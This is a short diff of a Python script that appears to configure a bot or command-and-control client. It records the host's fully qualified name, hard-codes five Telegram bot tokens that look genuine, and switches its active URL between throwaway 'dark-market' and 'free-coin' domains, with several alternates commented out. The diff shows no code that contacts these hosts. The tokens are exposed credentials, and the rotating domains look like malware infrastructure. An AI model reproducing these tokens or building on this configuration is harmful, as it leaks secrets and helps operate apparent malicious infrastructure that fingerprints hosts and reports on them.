@@ -3,14 +3,14 @@ import json
 import socket
 
 
-vversion="4.60"
+vversion="4.80"
 hostname_os=socket.getfqdn()
 
 telegram_tokens_bot=["0","5036803152:AAGs0ES1OmEdy86MNJDp7mp19BB5IQhcVHU","5099462819:AAEndTxvXaSqBQ6E_EpiCN02a81ROGPMgr0","5001651751:AAGzzbUfJXWHZz-FKJyLSUxzg-JiRMO5v-Q","5041058138:AAFRher-cMwnRI476iW24tT6Kt8lvC0bmLc","5051743922:AAEOHJTRzv2WIxZ8bR-VrVYNA6io6qB1Ltw"]
 
 # url_1="dark-market.likesyou.org"
-# url_1=" http://free-coin.nichesite.org/index.html"
-url_1="http://dark-market.likesyou.org/index.html"
+url_1=" http://free-coin.nichesite.org/index.html"
+# url_1="http://dark-market.likesyou.org/index.html"
 # url_1="https://www.iblogger.nl.eu.org/2021/12/getting-hostname-in-bash-in-linux.html"
 # url_1="http://dark-market.ueuo.com/index.html"
 # url_1="https://darkos-market.eu.org/index.html"
